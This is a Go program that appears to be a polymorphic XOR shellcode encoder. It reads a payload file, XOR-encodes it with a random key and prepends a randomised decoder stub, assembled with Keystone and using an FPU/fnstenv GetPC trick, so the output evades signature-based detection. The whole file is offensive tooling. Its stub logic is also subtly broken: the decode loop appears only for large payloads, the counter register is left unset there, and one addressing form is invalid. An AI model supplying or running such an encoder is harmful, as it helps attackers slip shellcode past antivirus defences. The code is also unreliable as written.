package main

import (
	"bytes"
	"encoding/hex"
	"fmt"
	"math/rand"
	"os"
	"time"

	ks "github.com/keystone-engine/keystone/bindings/go/keystone"
)

var REGISTERS = []map[int]string{
	{32: "EAX", 16: "AH", 8: "AL"},
	{32: "EBX", 16: "BH", 8: "BL"},
	{32: "ECX", 16: "CX", 8: "CL"},
	{32: "EDX", 16: "DX", 8: "DL"},
	{32: "ESI", 16: "SI"},
	{32: "EDI", 16: "DI"},
}

func readPld(path string) ([]byte, error) {
	return os.ReadFile(path)
}

func asmbl(code string) ([]byte, error) {
	ks, err := ks.New(ks.ARCH_X86, ks.MODE_32)
	if err != nil {
		return nil, err
	}
	defer ks.Close()

	encoding, _, success := ks.Assemble(code, 0)
	if !success {
		return nil, fmt.Errorf("failed to assemble")
	}

	return encoding, nil
}

func randFPU() []byte {
	fpuOpcodes := [][]byte{}

	for opCode := 0xe8; opCode <= 0xee; opCode++ {
		fpuOpcodes = append(fpuOpcodes, []byte{0xd9, byte(opCode)})
	}
	for opCode := 0xc0; opCode <= 0xdf; opCode++ {
		fpuOpcodes = append(fpuOpcodes, []byte{0xda, byte(opCode)})
	}
	for opCode := 0xc0; opCode <= 0xdf; opCode++ {
		fpuOpcodes = append(fpuOpcodes, []byte{0xdb, byte(opCode)})
	}
	for opCode := 0xc0; opCode <= 0xc7; opCode++ {
		fpuOpcodes = append(fpuOpcodes, []byte{0xdd, byte(opCode)})
	}

	fpuOpcodes = append(fpuOpcodes,
		[]byte{0xd9, 0xd0},
		[]byte{0xd9, 0xe1},
		[]byte{0xd9, 0xf6},
		[]byte{0xd9, 0xf7},
		[]byte{0xd9, 0xe5})

	return fpuOpcodes[rand.Intn(len(fpuOpcodes))]
}

func randByte() byte {
	return byte(rand.Intn(256))
}

func formatPld(pld []byte) string {
	return "\\x" + hex.EncodeToString(pld)
}

func randReg(size int, excludeRegs []string) string {
	availableRegs := []string{}

	for _, reg := range REGISTERS {
		if regName, ok := reg[size]; ok {
			exclude := false
			for _, exReg := range excludeRegs {
				if regName == exReg {
					exclude = true
					break
				}
			}
			if !exclude {
				availableRegs = append(availableRegs, regName)
			}
		}
	}
	return availableRegs[rand.Intn(len(availableRegs))]
}

func genDcdStb(pldLen int, key byte) ([]byte, error) {
	var dcdStb bytes.Buffer
	pcReg := randReg(32, []string{})
	fnstenvOffset := rand.Intn(12)
	offsetToEncodedPayload := fnstenvOffset + 6

	getPcAsm := fmt.Sprintf("fnstenv [esp-%#x]; ", fnstenvOffset)
	if rand.Intn(2) == 0 {
		instructionsCount := rand.Intn(5) + 1
		offsetToEncodedPayload += 4 * instructionsCount
		getPcAsm += fmt.Sprintf("pop %s", pcReg)
	}

	xorKeyReg := randReg(8, []string{"CL", pcReg}) // rand 8 bits

	xorAsm := ""

	if pldLen < 256 {
		offsetToEncodedPayload += 2
		xorAsm = fmt.Sprintf("mov CL, %#x; ", pldLen)
	} else {
		offsetToEncodedPayload += 4
		xorAsm += fmt.Sprintf("mov %s, %#x; decode: xor [%s + CL + %#x], %s; loop decode; ", xorKeyReg, key, pcReg, offsetToEncodedPayload-1, xorKeyReg)
	}

	dcdStb.Write(randFPU())

	assembledPcAsm, err := asmbl(getPcAsm)
	if err != nil {
		return nil, err
	}

	dcdStb.Write(assembledPcAsm)
	assembledXorAsm, err := asmbl(xorAsm)

	if err != nil {
		return nil, err
	}

	dcdStb.Write(assembledXorAsm)

	return dcdStb.Bytes(), nil
}

func encodePayload(payload []byte, key byte) []byte {
	encodedPayload := make([]byte, len(payload))
	for i, b := range payload {
		encodedPayload[i] = b ^ key
	}

	return encodedPayload
}

func encode(payloadPath string) ([]byte, error) {
	payload, err := readPld(payloadPath)
	if err != nil {
		return nil, err
	}
	key := randByte()
	encodedPayload := encodePayload(payload, key)
	dcdStb, err := genDcdStb(len(payload), key)
	if err != nil {
		return nil, err
	}
	return append(dcdStb, encodedPayload...), nil
}

func main() {
	rand.Seed(time.Now().UnixNano())

	if len(os.Args) != 2 {
		fmt.Println("Usage: go run je_ne_change_pas.go <payload_file_path>")
		os.Exit(1)
	}

	payloadPath := os.Args[1]
	encodedPayload, err := encode(payloadPath)
	if err != nil {
		fmt.Println("Error: ", err)
	}

	fmt.Println(formatPld(encodedPayload))
}
